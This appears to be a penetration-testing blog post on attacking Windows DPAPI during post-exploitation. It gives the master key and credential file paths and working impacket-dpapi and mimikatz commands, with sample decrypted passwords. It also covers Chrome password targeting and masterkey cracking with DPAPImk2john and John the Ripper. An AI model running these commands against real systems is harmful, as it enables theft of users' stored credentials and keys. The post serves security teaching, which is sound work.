---
layaout: post
image: /assets/dpapi/dpapi1.png
title: Attacks On Dpapi
date: 21-06-2025
categories: [ATTACKS]
tag: [DPAPI, Impacket, Mimikatz, LaZagne, DPAPImk2john]
excerpt: "DPAPI exploitation in Windows environments involves leveraging the Data Protection API to decrypt sensitive user secrets such as credentials, private keys, and tokens. This is typically done during post-exploitation when attackers have acquired user passwords, NTLM hashes, or SYSTEM privileges to access DPAPI masterkeys and recover protected data."
---
![img-description](/assets/dpapi/dpapi1.png)

DPAPI exploitation in Windows environments involves leveraging the Data Protection API to decrypt sensitive user secrets such as credentials, private keys, and tokens. This is typically done during post-exploitation when attackers have acquired user passwords, NTLM hashes, or SYSTEM privileges to access DPAPI masterkeys and recover protected data.

## Introduction

During the post-exploitation phase in Windows, accessing persistent credentials and secrets is a key goal. DPAPI (Data Protection API) is a critical Windows feature that encrypts sensitive information at the OS level. Understanding DPAPI’s internals and exploitation techniques is essential for penetration testers and red teamers conducting ethical security assessments in authorized environments.
## What is DPAPI?

DPAPI is a native Windows API (since Windows 2000) that enables applications to securely encrypt and decrypt sensitive data—such as credentials, private keys, and certificates—without directly managing cryptographic keys.
## How It Works

Each user has one or more master keys stored in:

```bash
%APPDATA%\Microsoft\Protect\<SID>\
```

These master keys are protected using one of the following methods:

- The user's **login password**, derived using **PBKDF2**, or
    
- The user's **NTLM hash**.

## Common DPAPI Use Cases

DPAPI is widely used across the Windows ecosystem, including:

- **Windows Credential Manager**
    
- **Private keys of certificates (.pfx)**
    
- **Saved passwords in web browsers** (e.g., Chrome, Edge)
    
- **Wi-Fi network passwords**

### Attacker Objectives

Once access to a system is obtained, a pentester can leverage DPAPI to:

- Extract locally stored **credentials and secrets**
    
- Recover **persistent tokens** or **authentication cookies**
    
- Decrypt **private keys** for signing or impersonation
    
- Access secrets **without requiring user interaction**

### DPAPI Attack Scenarios
####  1. Access via User Password

If a user's plaintext password is captured (e.g., through phishing, credential dumping, or brute-force), it can be used directly to decrypt the user’s masterkey and retrieve DPAPI-protected secrets.
##### Tools:

- mimikatz

- SharpDPAPI

- gsecdump

- impacket-dpapi

##### Practical Example with impacket-dpapi:

###### Step 1: Extract the masterkey file

```powershell
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\
```

###### Step 2: Locate DPAPI credential blobs

```powershell
C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
```

###### Step 3: Decrypt the masterkey using the known password

```bash
impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
```

###### Step 4: Use the decrypted key to unlock credentials

```bash
impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key <decrypted_key>
```

Output:

```bash
Username : acme\l.paredes_ops  
Password : Uncr4ck4bl3P4ssW0rd0312
```

#####  Why This Works

- No need for NTLM hashes or domain-level access.

- Works completely offline with local files.

- Faster and more direct than Pass-the-Hash methods.

####  2. Access via NTLM Hash

If a user’s NTLM hash is available (e.g., via LSASS dump, DCSync, or Pass-the-Hash), it can also be used to decrypt DPAPI secrets.
#####  Requirements:

- User's SID

- NTLM hash

- Target credential blob or masterkey file

#####  Example using mimikatz:

```powershell
mimikatz # dpapi::cred /in:CRED_FILE.crd /sid:S-1-5-21-... /hash:<NTLM_HASH>
```

####  3. Access with SYSTEM Privileges

With **SYSTEM-level privileges**, a tester can:

- Dump **all DPAPI masterkeys** from the system
    
- Read and decrypt DPAPI blobs across all users
    
- Extract secrets without requiring user interaction

#####  Recommended Tools:

- `mimikatz`
    
- `SharpDPAPI`
    
- `Seatbelt`

#####  Example:

```powershell
mimikatz # privilege::debug
mimikatz # lsadump::dpapi
```

####  4. Extracting Application Secrets (e.g., Chrome)

Many applications, like Google Chrome, rely on DPAPI to encrypt sensitive user data.
#####  Target File:

```bash
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
```

This is a SQLite database containing DPAPI-encrypted blobs. With the user’s masterkey and profile, a tester can recover all saved browser passwords.
#####  Tools:

- `chrome_dpapi_decrypt.py`
    
- `SharpChrome`
    
- `LaZagne`
    
- `BrowserGather`

#### 5. Validating and Cracking Masterkeys with dpapimk2john

If a DPAPI masterkey is obtained but the password is unknown, it can be validated or cracked using John the Ripper, after converting it with DPAPImk2john.
##### Example 1: Validate a Known Password

Assumptions:

- Masterkey: `655a0446-8420-431a-a5d7-2d18eb87b9c3`
    
- SID directory: `S-1-5-21-2168718921-3906202695-65158103-1000`
    
- Candidate password: `101RepAdmin123!!`

```bash
DPAPImk2john -mk ../S-1-5-21-2168718921-3906202695-65158103-1000/655a0446-8420-431a-a5d7-2d18eb87b9c3 -S ../S-1-5-21-2168718921-3906202695-65158103-1000 -c local --password '101RepAdmin123!!'
```

If correct, the decrypted key will be displayed.
##### Example 2: Crack with Dictionary

Convert masterkey to John-compatible hash:

```bash
DPAPImk2john -mk 655a0446-8420-431a-a5d7-2d18eb87b9c3 -S . -c local > hash.txt
```

Run the cracker:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Key Toolset

| Tool               | Description                                            |
| ------------------ | ------------------------------------------------------ |
| **Mimikatz**       | Decrypt DPAPI blobs, dump hashes, extract LSASS        |
| **SharpDPAPI**     | C# tool for advanced DPAPI abuse                       |
| **Impacket-dpapi** | Python suite for decrypting masterkeys and credentials |
| **DPAPImk2john**   | Converts masterkeys to John-compatible hash formats    |
| **Seatbelt**       | Post-exploitation discovery of DPAPI blobs             |
| **LaZagne**        | Automated local credential extraction                  |
| **BrowserGather**  | Extracts browser-specific secrets                      |
